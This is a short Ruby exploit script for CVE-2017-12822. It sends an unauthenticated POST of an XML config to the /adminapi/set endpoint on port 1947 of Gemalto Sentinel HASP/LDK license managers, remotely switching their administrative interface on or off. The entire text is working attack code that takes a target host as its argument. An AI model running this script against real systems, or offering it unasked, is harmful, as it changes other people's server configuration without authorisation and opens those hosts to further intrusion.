#!/usr/bin/env ruby 
# CVE-2017-12822
#
# Remote enabling and disabling administrative interface 
# opens new attack vectors on the remote system with Gemaltoâ€™s 
# HASP SRM, Sentinel HASP and Sentinel LDK products prior to 
# Sentinel LDK RTE version 7.55

require 'rex'

host   = ARGV[0]
on_off = ARGV[1] || "0" # 0 == off | 1 == on

def usage
  puts "[*] #{$0} <host> [0|1]"
  exit
end

usage if ARGV.size < 1

xml = %Q|<?xml version="1.0" encoding="UTF-8" ?>
<config>
   <accremote>#{on_off.to_i}</accremote>
   <pagerefresh>2</pagerefresh>
   <writeconfig />
</config>
|

begin

sock = Rex::Proto::Http::Client.new(host, port = "1947", context = {}, ssl = false)


req = sock.request_cgi(
	{
		#'uri'   => "/adminapi/get",
		'uri'   => "/adminapi/set",
		'version' => '1.0',
		'method' => 'POST',
                'data' => xml,
                'headers' => {
                       "User-Agent" => 'SentinelLDK/13.00',
                       "Connection" => 'Keep-Alive',
                       "Accept"     => '*/*',
                },
	})


	sock.send_request(req)
	data = sock.read_response()

        if data and data.body =~ /SNTL_ADMIN_STATUS_OK/
          puts "[*] Action Executed..."
        else
          puts "[!] Failed"
        end
rescue => e
 puts "[!] " + e.to_s
end


